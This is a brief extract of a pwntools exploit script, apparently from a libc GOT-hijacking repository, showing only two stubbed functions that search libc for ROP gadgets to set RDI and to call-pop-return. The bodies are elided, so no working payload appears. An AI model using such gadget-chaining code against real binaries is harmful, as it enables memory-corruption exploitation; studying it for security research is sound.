# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Libc-GOT-Hijacking\Post\one_punch.py
from pwn import *
...
def find_gadget_to_set_rdi(
    libc,
):  # Find a gadget to set RDI as the address on the stack.
...
def find_call_pop_ret_gadget(
    libc,
):  # Find a gadget to call a function and pop the stack.
